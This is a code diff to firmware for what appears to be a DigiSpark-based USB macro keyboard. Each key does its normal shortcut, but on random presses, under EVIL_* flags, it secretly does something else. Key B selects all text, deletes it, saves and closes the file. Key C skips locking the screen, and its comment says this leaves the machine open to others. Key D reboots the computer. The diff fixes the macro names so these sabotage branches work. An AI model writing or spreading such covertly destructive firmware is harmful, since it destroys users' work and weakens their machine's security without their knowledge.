@@ -86,11 +86,13 @@ void keyPressA(void)
   #ifdef EVIL_A
   if(random(EVIL_A_CHANCE) == 0)
   {
+    // Evil commands for key A
     DigiKeyboard.sendKeyStroke(KEY_B);
   }
   else
   {
   #endif
+    // Regular commands for key A
     DigiKeyboard.sendKeyStroke(KEY_A);
   #ifdef EVIL_A
   }
@@ -102,6 +104,7 @@ void keyPressB(void)
   #ifdef EVIL_B
   if(random(EVIL_B_CHANCE) == 0)
   {
+    // Evil commands for key B
     // Select everything, delete, save, close
     DigiKeyboard.sendKeyStroke(KEY_A , MOD_CONTROL_LEFT);
     DigiKeyboard.sendKeyStroke(KEY_DELETE);
@@ -111,8 +114,9 @@ void keyPressB(void)
   else
   {
   #endif
+    // Regular commands for key B
     DigiKeyboard.sendKeyStroke(KEY_V , MOD_CONTROL_LEFT);
-  #ifdef EVIL_A
+  #ifdef EVIL_B
   }
   #endif
 }
@@ -122,22 +126,25 @@ void keyPressC(void)
   #ifdef EVIL_C
   if(random(EVIL_C_CHANCE) == 0)
   {
+    // Evil commands for key C
     // nothing, don't lock the computer, letting others do nasty stuff to the computer
   }
   else
   {
   #endif
+    // Regular commands for key C
     DigiKeyboard.sendKeyStroke(KEY_L , MOD_GUI_LEFT);
-  #ifdef EVIL_A
+  #ifdef EVIL_C
   }
   #endif
 }
 
 void keyPressD(void)
 {
-  #ifdef EVIL_A
-  if(random(EVIL_A_CHANCE) == 0)
+  #ifdef EVIL_D
+  if(random(EVIL_D_CHANCE) == 0)
   {
+    // Evil commands for key D
     // Restart computer
     DigiKeyboard.sendKeyStroke(KEY_DELETE , MOD_CONTROL_LEFT | MOD_ALT_LEFT);
     DigiKeyboard.sendKeyStroke(KEY_UP);
@@ -148,8 +155,9 @@ void keyPressD(void)
   else
   {
   #endif
+    // Regular commands for key D
     DigiKeyboard.sendKeyStroke(KEY_DELETE, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
-  #ifdef EVIL_A
+  #ifdef EVIL_D
   }
   #endif
 }
